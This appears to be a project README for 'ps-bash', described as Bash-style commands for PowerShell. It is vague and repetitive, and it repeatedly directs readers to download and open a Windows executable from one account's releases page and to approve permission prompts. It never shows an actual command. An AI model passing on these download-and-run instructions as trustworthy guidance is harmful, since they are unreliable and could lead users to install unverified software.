# 🐚 ps-bash - Bash Commands in PowerShell

[![Download ps-bash](https://img.shields.io/badge/Download%20ps--bash-blue-grey)](https://github.com/Wenonechans7825/ps-bash/releases)

## 🧭 What ps-bash does

ps-bash lets you use Bash-style commands inside PowerShell on Windows, macOS, and Linux. It keeps the command shape you may already know, while still using PowerShell under the hood.

You get:

- Bash-like commands with real flags
- Output that fits normal shell use
- Typed objects behind the scenes
- Cross-platform use on Windows, macOS, and Linux
- A set of 67 commands with 775 tests

## 📥 Download and install

1. Visit the release page: https://github.com/Wenonechans7825/ps-bash/releases
2. Find the latest release
3. Download the file for Windows
4. Open the file you downloaded
5. Follow the on-screen steps to finish setup

If the release page gives you more than one file, pick the Windows file that matches your system:

- 64-bit Windows: choose the x64 file
- Older Windows systems: choose the x86 file, if shown
- Portable build: choose it if you want to run without a full install

## 🪟 Run on Windows

After you install ps-bash, open PowerShell from the Start menu.

Then load ps-bash by using the command that came with the release package. If the release includes a shortcut, start there first.

If you want to check that it works, run a simple command such as:

- list files
- show the current folder
- print help for a command

Look for normal command output in the window. ps-bash should behave like a shell tool, not like a web app.

## ⚙️ What to expect

ps-bash is built for command-line work. It is useful when you want Bash-style commands but you stay in PowerShell.

Common use cases include:

- working with files and folders
- checking system paths
- piping output from one command to another
- using shell scripts across platforms
- keeping the command style close to Bash while using PowerShell features

## 🧩 Basic usage

Use ps-bash the same way you would use other shell tools:

- open PowerShell
- run a command
- read the output
- chain commands when needed

Examples of what it can help with:

- browsing directories
- filtering text output
- moving or copying files
- checking process info
- running simple automation steps

If you already know basic shell commands, ps-bash should feel familiar.

## 📋 System requirements

ps-bash is made for desktop systems that support PowerShell and common shell tools.

Recommended setup:

- Windows 10 or newer
- PowerShell 7 or later
- Enough disk space for the app and its files
- Standard user rights for normal use
- Internet access for the first download

It also fits cross-platform use, so the same command style can work on macOS and Linux builds where supported.

## 🔍 Features

### 🧱 Real flags

ps-bash accepts command flags in a way that feels close to Bash. That helps when you want simple, direct command input.

### 📦 Typed objects underneath

PowerShell uses objects, not plain text only. ps-bash keeps that model, so output stays useful for follow-up commands.

### 🔁 Cross-platform

You can use the same tool across Windows, macOS, and Linux. That helps when you move between machines.

### 🧪 Tested command set

The project includes 67 commands and 775 tests. That gives a strong base for command behavior and shell flow.

### 🧰 Shell-friendly output

Commands return output that works well in terminal use. That makes it easier to read results and pass them to the next step.

## 🛠️ How to get started fast

1. Download ps-bash from the release page
2. Install or open the Windows package
3. Start PowerShell
4. Load ps-bash with the included command or shortcut
5. Run a simple file or folder command
6. Use help output to learn the available commands

If you are new to command-line tools, start with one command at a time. That makes it easier to see what each step does.

## 🗂️ Common things you can do

- view files in a folder
- move between folders
- copy or remove items
- search text in output
- pipe one command into another
- check system paths
- use the same shell habits on different systems

## 🧠 Tips for new users

- Start in a folder you know
- Use help output when you are not sure about a command
- Copy commands one line at a time
- Read the output before running the next command
- Keep the release page handy in case you want the latest build

## 📦 Release page

Download the latest Windows build here:

https://github.com/Wenonechans7825/ps-bash/releases

## 🧪 Command behavior

ps-bash aims to keep commands direct and predictable. It uses shell-style input, but it still works with PowerShell data types behind the scenes.

That means you can expect:

- clean command flags
- useful output for piping
- fewer steps for common shell tasks
- behavior that fits both simple use and deeper scripting

## 🖥️ Windows setup steps

1. Open the release page
2. Download the Windows file
3. Save it to your Downloads folder
4. Open the file
5. Allow the setup to finish
6. Open PowerShell
7. Run ps-bash from the installed location or included shortcut

If Windows asks for permission, approve the app only if you downloaded it from the release page above

## 📚 Learn the commands

Start with the commands you use most:

- file listing
- folder changes
- text search
- copy and move
- help and version checks

Use the built-in help where available. That is the fastest way to learn without needing a manual

## 🔐 Safe download path

Only use the release page linked above when you download ps-bash for Windows. That keeps you on the latest published version from the repository

## 🧭 Topics covered

bash, cli, cross-platform, devops, linux, macos, pipeline, powershell, powershell-module, shell, typed-objects, windows